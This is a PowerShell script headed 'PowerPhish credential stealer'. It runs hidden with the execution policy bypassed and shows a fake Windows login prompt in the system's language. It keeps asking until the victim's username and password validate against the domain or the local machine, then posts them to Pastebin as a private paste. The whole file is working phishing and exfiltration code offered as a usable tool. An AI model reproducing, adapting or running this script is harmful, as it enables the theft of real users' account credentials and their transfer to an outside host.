<# PowerPhish credential stealer

.DESCRIPTION This script is based on github.com/Dviros/CredsLeaker. It was trimmed down and modified to automatically switch languages based on the system language and upload the credentials to Pastebin.

.EXAMPLE powershell -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "PowerPhish.ps1"

.LINK https://github.com/lu-ka/PowerPhish
https://github.com/lu-ka/PS-Pastebin
https://github.com/Dviros/CredsLeaker
#>

# $timer is how many seconds the script waits after loading itself to memory before presenting the credential window.
$timer = "0"

# $forceLanguage is used to force the language and ignore the deteced system language. ($null = off, example = "en-US")
$forceLanguage = $null

# $url sets the "connection" name which is displayed in the message.
# FUTURE USE: Scan for installed software and use $url based on "trusted/known" software.
$url = "Microsoft Windows"

# Pastebin username
$u = "myusername"
# Pastebin password
$p = "mypassword"
# Pastebin api key from https://pastebin.com/doc_api
$k = "mydevkey"

# Supported languages (text is inspired from the remote desktop login prompt)
# English
$CaptionEN = "Enter your credentials"
$MessageEN = "These credentials will be used to connect to $url"
# German
$CaptionDE = "Anmeldeinformationen eingeben"
$MessageDE = "Diese Anmeldeinformationen werden beim Herstellen einer Verbindung mit $url verwendet."

# Get language based on WinSystemLocale (if no supported language is found the script will use English)
if ($null -eq $forceLanguage) {
    $language = Get-WinSystemLocale | Select-Object Name -ExpandProperty Name
} else { 
    $language = $forceLanguage
}

switch ($language) {
    en-AU {$Caption = $CaptionEN;$Message = $MessageEN}
    en-BZ {$Caption = $CaptionEN;$Message = $MessageEN}
    en-CA {$Caption = $CaptionEN;$Message = $MessageEN}
    en-CB {$Caption = $CaptionEN;$Message = $MessageEN}
    en-GB {$Caption = $CaptionEN;$Message = $MessageEN}
    en-IN {$Caption = $CaptionEN;$Message = $MessageEN}
    en-IE {$Caption = $CaptionEN;$Message = $MessageEN}
    en-JM {$Caption = $CaptionEN;$Message = $MessageEN}
    en-NZ {$Caption = $CaptionEN;$Message = $MessageEN}
    en-PH {$Caption = $CaptionEN;$Message = $MessageEN}
    en-ZA {$Caption = $CaptionEN;$Message = $MessageEN}
    en-TT {$Caption = $CaptionEN;$Message = $MessageEN}
    en-US {$Caption = $CaptionEN;$Message = $MessageEN}
    de-AT {$Caption = $CaptionDE;$Message = $MessageDE}
    de-DE {$Caption = $CaptionDE;$Message = $MessageDE}
    de-LI {$Caption = $CaptionDE;$Message = $MessageDE}
    de-LU {$Caption = $CaptionDE;$Message = $MessageDE}
    de-CH {$Caption = $CaptionDE;$Message = $MessageDE}
    default {$Caption = $CaptionEN;$Message = $MessageEN}
}

# Delay before execution
if ($timer) {
    $timer = ($timer -as [int])
    Start-Sleep -s $timer
}

# Add assemblies and initiate count down
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Clear-Host

$CurrentDomain_Name = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

# There are 6 different authentication protocols supported.
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = $Caption
$options.Message = $Message
$options.TargetName = "1"

# CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

# For our while loop
$status = $true

# The magic function
function GetCredentials() {
    while ($status) {

        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if ([string]::isnullorempty($creds.CredentialPassword)) {
            GetCredentials
        }
        if ([string]::isnullorempty($creds.CredentialUserName)) {
            GetCredentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $pass = $creds.CredentialPassword;
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $pass)

            if ([string]::isnullorempty($domain.name) -eq $true) {
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
                if ($workgroup_creds.ValidateCredentials($UserName, $pass) -eq $true) {
                    $domain = ".local"    
                    $loot = "$username`:$pass@$computername$domain"
                    PasteBinPost               
                    $status = $false
                    exit
                }
                else {
                    GetCredentials
                }
            }

            if ([string]::isnullorempty($domain.name) -eq $false) {
                $loot = "$username`:$pass@$computername$CurrentDomain_Name"
                PasteBinPost
                $status = $false 
                exit
            }
            else {
                GetCredentials
            }
        }
    }
}

# This function is based on my PS-Pastebin powershell script.
# https://github.com/lu-ka/PS-Pastebin
function PastebinPost() {
    # body for login request
    $body_login = @{
        api_dev_key = $k
        api_user_name = $u
        api_user_password = $p
    }

    # login request to Pastebin for temporary API key
    $api_key = Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_login.php" -Body $body_login

    # if $api_key is empty there was probably an authentication error
    if ($null -eq $api_key) {
        Write-Host -ForegroundColor Red "AUTHENTICATION ERROR"
        Write-Host -ForegroundColor Red "Please check network connectivity, username, password or developer key"
        Write-Host ""
        exit
    } else {
        # body for post request
        $body_post = @{
        api_option = "paste"
        api_user_key = $api_key
        api_paste_private = "2"
        api_dev_key = $k
        api_paste_code = $loot
        api_paste_name = (Get-Date -Format "yyyyMMddHHmm")
    }
        # post request to Pastebin
        Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_post.php" -Body $body_post
    }
}

GetCredentials